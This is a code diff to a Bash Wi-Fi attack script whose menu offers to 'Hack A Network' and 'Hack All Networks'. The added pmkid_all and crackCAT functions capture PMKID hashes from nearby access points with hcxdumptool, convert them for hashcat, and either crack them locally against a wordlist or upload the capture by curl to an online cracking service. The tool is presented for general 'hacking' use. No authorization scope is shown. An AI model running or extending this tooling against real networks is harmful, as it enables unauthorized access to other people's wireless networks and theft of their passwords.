@@ -63,7 +63,7 @@ banner () {        ##### Banner #####
     echo -e "${Red}            /~~\\ | |  \\ .__/ \\__, |  \\ | |     |     "
 
     #echo -e "${Yellow} \n                     Hack the world!!!     "
-    echo -e "${Green}\n   [Version: 2.0.6 Stable] Developed by: Liam Bendix"
+    echo -e "${Green}\n   [Version: 2.0.7 Stable] Developed by: Liam Bendix"
   
 }
 menu () {        ##### Display available options in two columns #####
@@ -83,7 +83,7 @@ menu () {        ##### Display available options in two columns #####
             1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network.."
                wifiHacking
                ;;
-            2) echo -e "\n[${Green}Selected${White}] Option 2 Decrypt Passowrd(s).."
+            2) echo -e "\n[${Green}Selected${White}] Option 2 Decrypt Password(s).."
                crack
                exit 0
                ;;
@@ -176,7 +176,7 @@ done
 echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
 echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack A Network"
 echo -e "      ${Red}[${Blue}2${Red}] ${Green}Hack All Networks"
-echo -e "      ${Red}[${Blue}3${Red}] ${Green}Decrypt Passowrd"
+echo -e "      ${Red}[${Blue}3${Red}] ${Green}PMKID Attacks"
 echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
 while true; do
 echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
@@ -189,8 +189,8 @@ case $option in
      attackAll
      exit 0
      ;;
-  3) echo -e "\n[${Green}Selected${White}] Option 3 Crack Password.."
-     crack
+  3) echo -e "\n[${Green}Selected${White}] Option 3 PMKID Attack.."
+     pmkid_all
      exit 0
      ;;
   4) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
@@ -457,7 +457,10 @@ sudo rm -f *.csv > /dev/null 2>&1
 sudo rm -f *.netxml > /dev/null 2>&1
 sudo rm -f airodump_output.log > /dev/null 2>&1
 sudo rm -f *.ivs > /dev/null 2>&1
+sudo rm -f *.hc22000 > /dev/null 2>&1
+sudo rm -f essidlist > /dev/null 2>&1
 cleanup_handshakes
+sudo mv *pcapng /handshakes > /dev/null 2>&1
 #exit
 
 }
@@ -894,6 +897,146 @@ recon() {
 }
 
 
+
+############################################################################################
+########PMKID###############################################################################
+
+pmkid_all () {
+
+# Call the function to select and set the interface into monitor mode
+network
+sudo systemctl stop NetworkManager.service
+sudo systemctl stop wpa_supplicant.service
+
+# Start the capture using hcxdumptool
+echo "Starting capture using hcxdumptool..."
+
+sudo hcxdumptool -i $foo -o dumpfile.pcapng --active_beacon --enable_status=15 
+# Convert the capture to a format usable by hashcat
+echo "Converting capture to hccapx format..."
+hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
+
+#cat essidlist
+#monitor
+
+# Crack the password using aircrack-ng and a wordlist
+crackCAT
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
+crackCAT () {
+    echo "Do you want to crack hashes from your device or from the web?"
+    select method in "Local (Device)" "Upload (WPA-Sec)"; do
+        case $method in
+            "Local (Device)")
+                # Local cracking with Hashcat or other methods (you can extend this part)
+                stopMon
+                echo "You have selected local cracking."
+                echo "Your current directory:"
+                pwd
+                ls *.txt
+                read -p "Enter path to wordlist : " wordlist
+                # Crack the password using aircrack-ng and a wordlist
+                echo "Attempting to crack the password..."
+                hashcat -m 22000 hash.hc22000 $wordlist 
+                exit
+                ;;
+            "Upload (WPA-Sec)")
+                stopMon
+                # Ask for the user's email for cracking (optional, based on the site)
+                echo "Please provide your email for WPA-Sec service:"
+                read -p "Email: " user_email
+
+                if [[ -z "$user_email" ]]; then
+                    echo "Email cannot be empty. Exiting."
+                    exit 1
+                fi
+
+                # Ask for the path to the .cap file
+                echo "Please provide the path to your .pcapng file:"
+                echo "Your current directory:"
+                pwd
+                ls *.pcapng
+                read -p "Path to .pcapng file: " capture_file
+
+                # Check if the file exists
+                if [[ ! -f "$capture_file.pcapng" ]]; then
+                    echo "File not found. Exiting."
+                    exit 1
+                fi
+
+                # Ensure user agrees to terms and conditions (optional, based on the site)
+                echo "Please agree to the Terms & Conditions by typing 'yes':"
+                read agreement
+
+                if [[ "$agreement" != "yes" ]]; then
+                    echo "You must agree to the terms to continue. Exiting."
+                    exit 1
+                fi
+
+                # Read the key from key.txt
+                if [[ ! -f "key.txt" ]]; then
+                    echo "key.txt file not found. Exiting."
+                    exit 1
+                fi
+
+                # Get the key from key.txt
+                key=$(cat key.txt)
+
+                # Check if the key is empty
+                if [[ -z "$key" ]]; then
+                    echo "Key in key.txt is empty. Exiting."
+                    exit 1
+                fi
+
+                # Upload to WPA-Sec
+                echo "Uploading $cap_file to WPA-Sec..."
+                response=$(curl -s -w "%{http_code}" -X POST "https://wpa-sec.stanev.org/?submit" \
+                    -F "email=$user_email" \
+                    -F "file=@$capture_file.pcapng" \
+                    -F "key=$key" \
+                    -F "submit=Submit")
+
+                # Output the response status code and body for debugging
+                echo "Response: $response" 
+                echo "This capture is legacy but will still work..."
+                echo "Handshakes have been successfully submitted. If a password is found you will receive an email."
+
+                # Check the response to determine if submission was successful
+                if [[ "$response" == *"Cracking started"* ]]; then
+                    echo "Cracking request submitted successfully."
+                else
+                    echo "Error submitting your request. Please try again. Response: $response"
+                    exit 1
+                fi
+                break
+                ;;
+            *)
+                echo "Invalid option. Please select either 'Local' or 'Upload'."
+                ;;
+        esac
+    done
+
+
+
+}
+
+
+
+
+
+############################################################################################
 macChange() {
      ##### Display available options #####
 echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
@@ -1384,6 +1527,9 @@ trap interrupt_handler SIGINT SIGTERM
 #    sleep 1
 #done
 }
+
+
+
 
 
 targeted () {
